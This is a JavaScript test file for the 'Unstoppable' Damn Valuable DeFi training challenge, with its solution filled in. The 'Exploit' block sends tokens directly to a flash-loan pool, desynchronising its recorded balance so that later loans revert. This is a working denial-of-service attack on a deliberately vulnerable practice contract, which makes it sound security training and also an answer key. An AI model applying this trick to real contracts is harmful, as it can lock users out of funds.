const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer; 
    let attacker; 
    let someUser;
    let token;
    let pool;
    let receiverContract;
    

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        token = await DamnValuableTokenFactory.deploy();
        pool = await UnstoppableLenderFactory.deploy(token.address);

        await token.approve(pool.address, TOKENS_IN_POOL);
        await pool.depositTokens(TOKENS_IN_POOL);

        await token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await token.balanceOf(pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         receiverContract = await ReceiverContractFactory.deploy(pool.address);
         await receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        await token.connect(attacker).transfer(pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
        expect (
            await token.balanceOf(pool.address)
        ).to.not.equal(await pool.poolBalance());
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
